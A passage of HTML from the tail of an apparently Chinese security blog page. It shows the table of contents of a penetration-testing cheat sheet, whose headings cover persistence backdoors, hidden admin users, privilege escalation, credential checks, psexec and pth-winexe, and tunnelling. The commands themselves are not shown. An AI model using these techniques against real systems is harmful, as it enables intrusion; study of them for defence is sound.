<span class="toc-text">Windows BitsAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">9.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">9.1.</span> <span class="toc-text">利用服务进行持久化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%8C%81%E4%B9%85%E5%8C%96%E5%90%8E%E9%97%A8"><span class="toc-number">9.2.</span> <span class="toc-text">创建持久化后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="toc-number">9.3.</span> <span class="toc-text">创建用户并添加到本地管理员组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7"><span class="toc-number">9.4.</span> <span class="toc-text">隐藏用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">9.5.</span> <span class="toc-text">利用服务配置错误进行提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E6%9F%A5%E6%89%BE%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">9.6.</span> <span class="toc-text">递归查找隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90"><span class="toc-number">9.7.</span> <span class="toc-text">检查文件&#x2F;目录权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5Windows%E5%AD%98%E5%82%A8%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">9.8.</span> <span class="toc-text">检查Windows存储的凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%9C%AA%E6%B3%A8%E5%86%8C%EF%BC%88%E5%BC%95%E7%94%A8%EF%BC%89%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">9.9.</span> <span class="toc-text">检查未注册（引用）的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E8%BF%9B%E7%A8%8B"><span class="toc-number">9.10.</span> <span class="toc-text">开启进程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell-1"><span class="toc-number">9.10.1.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cmd"><span class="toc-number">9.10.2.</span> <span class="toc-text">cmd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-number">9.10.3.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pth-WinExe"><span class="toc-number">9.10.4.</span> <span class="toc-text">Pth-WinExe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">10.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.1.</span> <span class="toc-text">SSH本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.2.</span> <span class="toc-text">SSH动态端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.3.</span> <span class="toc-text">SSH远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proxy-Tunnel"><span class="toc-number">10.4.</span> <span class="toc-text">Proxy Tunnel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E9%9A%A7%E9%81%93-SSH-Over-HTTP"><span class="toc-number">10.5.</span> <span class="toc-text">HTTP隧道: SSH Over HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netsh%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">10.6.</span> <span class="toc-text">netsh端口转发</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2020/11/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/">&lt; 避开Windows API执行Shellcode</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2023 <a href="/." rel="nofollow">忘返</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
